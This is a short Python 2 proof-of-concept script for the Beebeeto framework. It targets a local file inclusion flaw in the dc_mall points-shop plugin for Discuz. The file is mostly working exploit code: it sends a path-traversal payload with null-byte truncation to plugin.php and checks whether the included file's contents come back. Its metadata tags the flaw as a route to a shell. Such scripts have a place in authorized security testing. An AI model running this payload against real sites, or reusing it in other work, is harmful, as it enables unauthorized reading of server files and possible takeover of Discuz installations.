#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0143',
            'name': 'Discuz Plugin [DC 积分商城] 本地文件包含漏洞 POC',
            'author': '1024',
            'create_date': '2015-10-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['*'],
            'type': 'Local File Inclusion',
            'tag': ['Discuz 插件GETSHELL漏洞', 'DC积分商城漏洞', '本地文件包含漏洞', 'php'],
            'desc': '''
                    $file = DISCUZ_ROOT.'./source/plugin/dc_mall/module/index/'.$action.'.inc.php';
                    // action参数未过滤直接传入$file后面的用%00截断即可包含任意文件
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-0131386',
                        ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = '/plugin.php?action=../../../../../static/js/common.js%00&id=dc_mall'
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'ele.getElementsByClassName(classname);' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
